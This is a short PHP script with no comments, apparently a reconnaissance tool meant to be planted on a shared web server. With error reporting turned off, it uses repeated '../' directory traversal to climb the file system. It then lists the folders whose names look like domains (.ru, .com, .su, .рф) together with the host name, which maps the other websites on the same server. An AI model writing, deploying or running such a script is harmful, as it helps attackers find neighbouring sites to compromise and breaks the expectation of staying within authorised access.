<?php

ini_set("display_errors","off");
error_reporting(0);

  function showTree($folder, $space) {
 
    $files = scandir($folder);
    foreach($files as $file) {

      if (($file == ".") || ($file == "..")) continue;
      $f0 = $folder."/".$file; 

      if (is_dir($f0)) {

       if (strpos($file, "ru")!=false) echo $space.$file."&nbsp;&nbsp;&nbsp;&nbsp;".$_SERVER["HTTP_HOST"]."<br />";
       if (strpos($file, "com")!=false) echo $space.$file."&nbsp;&nbsp;&nbsp;&nbsp;".$_SERVER["HTTP_HOST"]."<br />";
       if (strpos($file, "su")!=false) echo $space.$file."&nbsp;&nbsp;&nbsp;&nbsp;".$_SERVER["HTTP_HOST"]."<br />";
       if (strpos($file, "рф")!=false) echo $space.$file."&nbsp;&nbsp;&nbsp;&nbsp;".$_SERVER["HTTP_HOST"]."<br />";
       if (strpos($file, "XN--P1AI")!=false) echo $space.$file."&nbsp;&nbsp;&nbsp;&nbsp;".$_SERVER["HTTP_HOST"]."<br />";


      }
    }
  }

  showTree("./../../../../../../../../", "");
  showTree("./../../../../../../../", "");
  showTree("./../../../../../../", "");
  showTree("./../../../../../", "");
  showTree("./../../../../", "");
  showTree("./../../../", "");


?>